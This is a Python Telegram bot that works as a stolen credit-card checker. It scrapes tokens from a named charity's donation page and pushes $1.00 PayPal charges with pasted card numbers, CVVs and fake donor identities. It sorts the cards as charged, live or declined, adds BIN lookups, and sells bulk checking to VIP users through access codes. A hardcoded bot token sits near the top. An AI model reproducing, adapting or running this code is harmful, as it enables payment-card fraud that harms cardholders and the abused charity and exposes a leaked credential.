import os
import re
import time
import random
import string
import asyncio
import httpx
import requests, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from faker import Faker
from urllib.parse import urlparse
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, MessageHandler, filters, ContextTypes
)

TOKEN = '7834120140:AAFKg-uBhB6ZFpDQqf3imLqyX9X2E2qO_XE'

# ------------------- PayPal Gateway Class -------------------
 class PayPal:
        def __init__(self):
                self.first_name = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles"]
                self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
                url = 'https://riversidefoxfoundation.org/donations/preview'
                parsed = urlparse(url)
                domain = parsed.netloc
                path = parsed.path
                self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
                self.donation = "1.00"
                self.url = domain
                self.inurl = path
                self.email = f"{random.choice(self.first_name)}{random.choice(self.last_name)}{random.randint(100,999)}@gmail.com"
                self.r = requests.Session()
                self.uu = UserAgent()



        def Key(self):
                he1 = {
                        'upgrade-insecure-requests': '1',
                        'user-agent': self.uu.random,
                }
                r1 = self.r.get(f'https://{self.url}{self.inurl}', headers=he1, )
                self.id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1.text).group(1)
                self.id_form2 = re.search(r'name="give-form-id" value="(.*?)"', r1.text).group(1)
                self.nonec = re.search(r'name="give-form-hash" value="(.*?)"', r1.text).group(1)
                enc = re.search(r'"data-client-token":"(.*?)"',r1.text).group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                self.au = re.search(r'"accessToken":"(.*?)"', dec).group(1)
                return self.au, self.id_form1, self.id_form2, self.nonec

        def Krs(self, ccx):
                ccx=ccx.strip()
                n = ccx.split("|")[0]
                mm = ccx.split("|")[1]
                yy = ccx.split("|")[2]
                cvc = ccx.split("|")[3].strip()
                if "20" in yy:
                        yy = yy.split("20")[1]
                he2 = {
                        'user-agent': self.uu.random,
                        'x-requested-with': 'XMLHttpRequest',
                }

                da1 = {
                    'give-honeypot': '',
                    'give-form-id-prefix': self.id_form1,
                    'give-form-id': self.id_form2,
                    'give-form-title': 'Make a One-off Donation',
                    'give-current-url': f'https://{self.url}{self.inurl}',
                    'give-form-url': f'https://{self.url}{self.inurl}',
                    'give-form-minimum': self.donation,
                    'give-form-maximum': '50000',
                    'give-form-hash': self.nonec,
                    'give-price-id': 'custom',
                    'give-recurring-logged-in-only': '',
                    'give-logged-in-only': self.donation,
                    'give_recurring_donation_details': '{"is_recurring":false}',
                    'give-amount': self.donation,
                    'give_stripe_payment_method': '',
                    'payment-mode': 'paypal-commerce',
                    'give_first': random.choice(self.first_name),
                    'give_last': random.choice(self.last_name),
                    'give_email': self.email,
                    'card_name': 'msms',
                    'card_exp_month': '',
                    'card_exp_year': '',
                    'give_gift_check_is_billing_address': 'no',
                    'give_gift_aid_address_option': 'billing_address',
                    'give_gift_aid_card_first_name': '',
                    'give_gift_aid_card_last_name': '',
                    'give_gift_aid_billing_country': 'GB',
                    'give_gift_aid_card_address': '',
                    'give_gift_aid_card_address_2': '',
                    'give_gift_aid_card_city': '',
                    'give_gift_aid_card_state': '',
                    'give_gift_aid_card_zip': '',
                    'give_action': 'purchase',
                    'give-gateway': 'paypal-commerce',
                    'action': 'give_process_donation',
                    'give_ajax': 'true',
                }

                r2 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', headers=he2, data=da1, )

                da2 = MultipartEncoder({
                    'give-honeypot': (None, ''),
                    'give-form-id-prefix': (None, self.id_form1),
                    'give-form-id': (None, self.id_form2),
                    'give-form-title': (None, 'Make a One-off Donation'),
                    'give-current-url': (None, f'https://{self.url}{self.inurl}',),
                    'give-form-url': (None, f'https://{self.url}{self.inurl}',),
                    'give-form-minimum': (None, '1'),
                    'give-form-maximum': (None, '50000'),
                    'give-form-hash': (None, self.nonec),
                    'give-price-id': (None, 'custom'),
                    'give-recurring-logged-in-only': (None, ''),
                    'give-logged-in-only': (None, '1'),
                    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
                    'give-amount': (None, '1'),
                    'give_stripe_payment_method': (None, ''),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, random.choice(self.first_name)),
                    'give_last': (None, random.choice(self.last_name)),
                    'give_email': (None, self.email),
                    'card_name': (None, 'ali'),
                    'card_exp_month': (None, ''),
                    'card_exp_year': (None, ''),
                   'give_gift_check_is_billing_address': (None, 'no'),
                    'give_gift_aid_address_option': (None, 'billing_address'),
                    'give_gift_aid_card_first_name': (None, ''),
                    'give_gift_aid_card_last_name': (None, ''),
                    'give_gift_aid_billing_country': (None, 'GB'),
                    'give_gift_aid_card_address': (None, ''),
                    'give_gift_aid_card_address_2': (None, ''),
                    'give_gift_aid_card_city': (None, ''),
                    'give_gift_aid_card_state': (None, ''),
                    'give_gift_aid_card_zip': (None, ''),
                    'give-gateway': (None, 'paypal-commerce'),
                })

                he3 = {
                    'accept': '*/*',
                    'content-type': da2.content_type,
                    'user-agent': self.uu.random,
                }

                pa1 = {
                    'action': 'give_paypal_commerce_create_order',
                }

                r3 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa1,headers=he3,data=da2, ).json()['data']['id']


                he4 = {
                    'authority': 'cors.api.paypal.com',
                    'accept': '*/*',
                    'authorization': f'Bearer {self.au}',
                    'braintree-sdk-version': '3.32.0-payments-sdk-dev',
                    'paypal-client-metadata-id': self.paypal,
                    'user-agent': self.uu.random,
                }

                da3 = {
                    'payment_source': {
                        'card': {
                            'number': n,
                            'expiry': f'20{yy}-{mm}',
                            'security_code': cvc,
                            'attributes': {
                                'verification': {
                                    'method': 'SCA_WHEN_REQUIRED',
                                },
                            },
                        },
                    },
                    'application_context': {
                        'vault': False,
                    },
                }

                r4 = self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{r3}/confirm-payment-source', headers=he4, json=da3, )


                da4=MultipartEncoder({
                    'give-honeypot': (None, ''),
                    'give-form-id-prefix': (None, self.id_form1),
                    'give-form-id': (None, self.id_form2),
                    'give-form-title': (None, 'Make a One-off Donation'),
                    'give-current-url': (None, f'https://{self.url}{self.inurl}'),
                    'give-form-url': (None, f'https://{self.url}{self.inurl}'),
                    'give-form-minimum': (None, '1'),
                    'give-form-maximum': (None, '50000'),
                    'give-form-hash': (None, self.nonec),
                    'give-price-id': (None, 'custom'),
                    'give-recurring-logged-in-only': (None, ''),
                    'give-logged-in-only': (None, self.donation),
                    'give_recurring_donation_details': (None, '{"is_recurring":false}'),
                    'give-amount': (None, self.donation),
                    'give_stripe_payment_method': (None, ''),
                    'payment-mode': (None, 'paypal-commerce'),
                    'give_first': (None, random.choice(self.first_name)),
                    'give_last': (None, random.choice(self.last_name)),
                    'give_email': (None, self.email),
                    'card_name': (None, 'ali'),
                    'card_exp_month': (None, ''),
                    'card_exp_year': (None, ''),
                    'give_gift_check_is_billing_address': (None, 'no'),
                    'give_gift_aid_address_option': (None, 'billing_address'),
                    'give_gift_aid_card_first_name': (None, ''),
                    'give_gift_aid_card_last_name': (None, ''),
                    'give_gift_aid_billing_country': (None, 'GB'),
                    'give_gift_aid_card_address': (None, ''),
                    'give_gift_aid_card_address_2': (None, ''),
                    'give_gift_aid_card_city': (None, ''),
                    'give_gift_aid_card_state': (None, ''),
                    'give_gift_aid_card_zip': (None, ''),
                    'give-gateway': (None, 'paypal-commerce'),

                })

                he5 = {
                    'accept': '*/*',
                    'content-type': da4.content_type,
                    'user-agent': self.uu.random,
                }

                pa2 = {
                    'action': 'give_paypal_commerce_approve_order',
                    'order': r3,
                }

                r5 = self.r.post(f'https://{self.url}/wp-admin/admin-ajax.php', params=pa2,headers=he5, data=da4, )

                text = r5.text
                if 'true' in text or 'sucsess' in text:
                        return 'CHARGE 1.00$'
                elif 'DO_NOT_HONOR' in text:
                        return "DO_NOT_HONOR"
                elif 'ACCOUNT_CLOSED' in text:
                        return "ACCOUNT_CLOSED"
                elif 'PAYER_ACCOUNT_LOCKED_OR_CLOSED' in text:
                        return "PAYER_ACCOUNT_LOCKED_OR_CLOSED"
                elif 'LOST_OR_STOLEN' in text:
                        return "LOST_OR_STOLEN"
                elif 'CVV2_FAILURE' in text:
                        return "CVV2_FAILURE"
                elif 'SUSPECTED_FRAUD' in text:
                        return "SUSPECTED_FRAUD"
                elif 'INVALID_ACCOUNT' in text:
                        return "INVALID_ACCOUNT"
                elif 'REATTEMPT_NOT_PERMITTED' in text:
                        return "REATTEMPT_NOT_PERMITTED"
                elif 'ACCOUNT_BLOCKED_BY_ISSUER' in text:
                        return "ACCOUNT_BLOCKED_BY_ISSUER"
                elif 'ORDER_NOT_APPROVED' in text:
                        return "ORDER_NOT_APPROVED"
                elif 'PICKUP_CARD_SPECIAL_CONDITIONS' in text:
                        return "PICKUP_CARD_SPECIAL_CONDITIONS"
                elif 'PAYER_CANNOT_PAY' in text:
                        return "PAYER_CANNOT_PAY"
                elif 'INSUFFICIENT_FUNDS' in text:
                        return "INSUFFICIENT_FUNDS"
                elif 'GENERIC_DECLINE' in text:
                        return "GENERIC_DECLINE"
                elif 'COMPLIANCE_VIOLATION' in text:
                        return "COMPLIANCE_VIOLATION"
                elif 'TRANSACTION_NOT_PERMITTED' in text:
                        return "TRANSACTION_NOT_PERMITTED"
                elif 'PAYMENT_DENIED' in text:
                        return "PAYMENT_DENIED"
                elif 'INVALID_TRANSACTION' in text:
                        return "INVALID_TRANSACTION"
                elif 'RESTRICTED_OR_INACTIVE_ACCOUNT' in text:
                        return "RESTRICTED_OR_INACTIVE_ACCOUNT"
                elif 'SECURITY_VIOLATION' in text:
                        return "SECURITY_VIOLATION"
                elif 'DECLINED_DUE_TO_UPDATED_ACCOUNT' in text:
                        return "DECLINED_DUE_TO_UPDATED_ACCOUNT"
                elif 'INVALID_OR_RESTRICTED_CARD' in text:
                        return "INVALID_OR_RESTRICTED_CARD"
                elif 'EXPIRED_CARD' in text:
                        return "EXPIRED_CARD"
                elif 'CRYPTOGRAPHIC_FAILURE' in text:
                        return "CRYPTOGRAPHIC_FAILURE"
                elif 'TRANSACTION_CANNOT_BE_COMPLETED' in text:
                        return "TRANSACTION_CANNOT_BE_COMPLETED"
                elif 'DECLINED_PLEASE_RETRY' in text:
                        return "DECLINED_PLEASE_RETRY_LATER"
                elif 'TX_ATTEMPTS_EXCEED_LIMIT' in text:
                        return "TX_ATTEMPTS_EXCEED_LIMIT"
                else:
                        try:
                                result = r5.json()['data']['error']
                                return result
                        except:
                                return "UNKNOWN_ERROR"
                   

                
                                                        
# ------------------- Users -------------------

ADMINS = [6843321125]  # ضع هنا ID الأدمن
VIP_USERS = {}  # {user_id: expiration_timestamp}
BANNED_USERS = {}  # {user_id: True}
ALL_USERS = set()  # كل مستخدم دخل البوت
stop_users = {}
last_check_time = {}
ANTI_SPAM_SECONDS = 7

user_tasks = {}

# ------------------- Codes -------------------

CODES = {}  # {"WAFA-XXXX-XXXX-XXXX": {"duration":7, "max_users":5, "used":0, "created":timestamp}}

# ------------------- BIN Lookup -------------------

async def get_bin_info(bin_number):
    urls = [
        f"https://lookup.binlist.net/{bin_number}",
        f"https://bins.antipublic.cc/bins/{bin_number}",
        f"https://bincheck.io/api/{bin_number}"
    ]
    for attempt in range(3):
        for url in urls:
            try:
                async with httpx.AsyncClient(timeout=10) as client:
                    r = await client.get(url)
                if r.status_code != 200:
                    continue
                data = r.json()
                brand = data.get("scheme") or data.get("brand") or data.get("type")
                card_type = data.get("type") or data.get("card_type")
                bank = data.get("bank", {}).get("name") if isinstance(data.get("bank"), dict) else data.get("bank")
                country = data.get("country", {}).get("name") if isinstance(data.get("country"), dict) else data.get("country")
                if not bank:
                    bank = data.get("issuer") or data.get("bank_name")
                if not country:
                    country = data.get("country_name")
                if brand or bank or country:
                    return (f"{brand or 'Unknown'} - {card_type or 'Unknown'}", bank or "Unknown", country or "Unknown")
            except:
                continue
            await asyncio.sleep(0.5)
    return "Unknown", "Unknown", "Unknown"

# ------------------- Check API -------------------

async def check_card_api(card_full):
    try:
        paypal_checker = PayPal()
        await asyncio.to_thread(paypal_checker.Key)
        result_raw = await asyncio.to_thread(paypal_checker.Krs, card_full)
        result = result_raw.lower()
        if "charge 1.00$" in result or "success" in result:
            return "approved", result_raw
        elif "insufficient_funds" in result:
            return "live", result_raw
        else:
            return "declined", result_raw
    except Exception as e:
        return "declined", f"Error: {e}"

# ------------------- Format Response -------------------

async def format_response(card_full, status, response, taken):
    bin_number = card_full.split("|")[0][:6]
    info, bank, country = await get_bin_info(bin_number)

    if status == "approved":
        status_text = "#Charge 🔥"
    elif status == "live":
        status_text = "#Live ✅"
    else:
        status_text = "#Declined ❌"
    return f"""#PayPal_Custom ($1.00) 🌟 

[ϟ] Card: {card_full}
[ϟ] Response: {response}
[ϟ] Status: {status_text}
[ϟ] Taken: {taken}s

[ϟ] Info: {info}
[ϟ] Bank: {bank}
[ϟ] Country: {country}
[⌤] Dev by: Wafa - 🍀"""

# ------------------- Permissions -------------------

def can_user_check(user_id, mode="file"):
    if user_id in ADMINS:
        return True
    elif BANNED_USERS.get(user_id):
        return False
    elif user_id in VIP_USERS and VIP_USERS[user_id] > time.time():
        return True
    else:
        return mode == "single"

# ------------------- /pp -------------------

async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "single"):
        await update.message.reply_text("❌ VIP only for single check.")
        return
    if user_id not in ADMINS and (user_id not in VIP_USERS or VIP_USERS[user_id] < time.time()):
        now = time.time()
        last = last_check_time.get(user_id, 0)
        if now - last < ANTI_SPAM_SECONDS:
            await update.message.reply_text(f"❌ Wait {ANTI_SPAM_SECONDS} seconds before next check")
            return
        last_check_time[user_id] = now
    try:
        asyncio.create_task(process_pp(update, context))
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def process_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    card_full = " ".join(context.args)
    if not card_full:
        await update.message.reply_text("Usage:\n/pp 4242424242424242|09|28|123")
        return
    start_time = time.time()
    status, response = await check_card_api(card_full)
    taken = round(time.time() - start_time, 2)
    text = await format_response(card_full, status, response, taken)
    await update.message.reply_text(text)

# ------------------- /stop -------------------

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = True
    await update.message.reply_text("Stopped ⛔")

# ------------------- File Handler -------------------

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if not can_user_check(user_id, "file"):
        await update.message.reply_text("❌ VIP only for file check.")
        return
    if user_id not in ADMINS:
        if user_id in user_tasks and not user_tasks[user_id].done():
            await update.message.reply_text("❌ Wait until current file finishes")
            return
    try:
        task = asyncio.create_task(process_file(update, context))
        user_tasks[user_id] = task
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

# ------------------- process_file -------------------

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stop_users[user_id] = False
    try:
        os.makedirs("downloads", exist_ok=True)
        file = await update.message.document.get_file()
        file_path = f"downloads/{file.file_id}.txt"
        await file.download_to_drive(file_path)

        results_file_path = f"downloads/results_{file.file_id}.txt"
        approved = live = declined = 0
        panel_msg = await update.message.reply_text("Start Checking... 🔍")
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        async def process_line(line):
            nonlocal approved, live, declined
            try:
                match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
                if not match:
                    return
                card_full = match[0]
                start_time = time.time()
                status, response = await check_card_api(card_full)
                await asyncio.sleep(random.uniform(0, 2))
                taken = round(time.time() - start_time, 2)
                text = await format_response(card_full, status, response, taken)
                if status == "approved":
                    approved += 1
                    await update.message.reply_text(text)
                elif status == "live":
                    live += 1
                    await update.message.reply_text(text)
                else:
                    declined += 1
                last_info, last_bank, last_country = await get_bin_info(card_full.split("|")[0][:6])
                panel = f"""📊 Status 

✅ Charge: {approved} 💥
🟢 Live: {live} 💫
❌ Declined: {declined}
📂 Total: {approved + live + declined}

━━━━━━━━━━━━━━━
💳 Last Card: {card_full}
📨 Response: {response}
🏦 Info: {last_info}
🏛 Bank: {last_bank}
🌍 Country: {last_country}
📌 Status: {status}
━━━━━━━━━━━━━━━

⛔ Stop: {'ON' if stop_users.get(user_id) else 'OFF'}"""
                try:
                    await panel_msg.edit_text(panel)
                except:
                    pass
                return text
            except Exception as e:
                print(f"Line Error: {e}")
                return None

        for line in lines:
            if stop_users.get(user_id):
                await update.message.reply_text("Stopped ⛔")
                return
            try:
                await process_line(line)
            except Exception as e:
                print(f"Loop Error: {e}")
                continue

        with open(results_file_path, 'w', encoding='utf-8') as result_file:
            for line in lines:
                try:
                    r = await format_response(line.strip(), "N/A", "N/A", 0)
                    result_file.write(r + "\n\n")
                except:
                    continue
        await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")

    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

# ------------------- ERROR HANDLER -------------------

async def error_handler(update, context):
    print(f"Global Error: {context.error}")

# ------------------- /try -------------------

async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMINS:
        return
    try:
        user_id = int(context.args[0])
        reply_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=user_id, text=reply_text)
        await update.message.reply_text("✅ Sent")
    except:
        await update.message.reply_text("❌ Usage:\n/try 123456789 hello")

# ------------------- /code -------------------

async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/code YOURCODEHERE")
    code = context.args[0].upper()
    if code not in CODES:
        return await update.message.reply_text("❌ Invalid code")
    code_data = CODES[code]
    if code_data["used"] >= code_data["max_users"]:
        return await update.message.reply_text("❌ Code usage limit reached")
    VIP_USERS[user_id] = int(time.time()) + code_data["duration"] * 86400
    code_data["used"] += 1
    await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")

# ------------------- /wafa -------------------

async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return await update.message.reply_text("❌ Only admin can create codes")
    if len(context.args) < 2:
        return await update.message.reply_text("Usage:\n/wafa DAYS MAX_USERS")
    try:
        duration = int(context.args[0])
        max_users = int(context.args[1])
    except:
        return await update.message.reply_text("❌ Invalid numbers")
    code = "WAFA-" + "-".join("".join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    CODES[code] = {"duration": duration, "max_users": max_users, "used": 0, "created": time.time()}
    await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")

# ------------------- /show_users -------------------

async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return await update.message.reply_text("❌ Only admin")
    msg = "📊 All Users:\n\n"
    for uid in ALL_USERS:
        status = "BANNED" if uid in BANNED_USERS else "VIP" if uid in VIP_USERS else "NORMAL"
        expire = f" expires in {int((VIP_USERS[uid] - time.time()) / 3600)}h" if uid in VIP_USERS else ""
        msg += f"{uid} - {status}{expire}\n"
    await update.message.reply_text(msg if msg else "No users yet")

# ------------------- Ban/Unban -------------------

async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return await update.message.reply_text("❌ Only admin can ban users")
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/ban_user USER_ID")
    uid = int(context.args[0])
    BANNED_USERS[uid] = True
    VIP_USERS.pop(uid, None)
    await update.message.reply_text(f"User {uid} banned ✅")

async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMINS:
        return await update.message.reply_text("❌ Only admin can unban users")
    if len(context.args) == 0:
        return await update.message.reply_text("Usage:\n/unban_user USER_ID")
    uid = int(context.args[0])
    BANNED_USERS.pop(uid, None)
    await update.message.reply_text(f"User {uid} unbanned ✅")

# ------------------- /start -------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    ALL_USERS.add(user_id)
    await update.message.reply_text("Bot Ready 💬")

# ------------------- Run -------------------

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.run_polling()

if __name__ == "__main__":
    main()
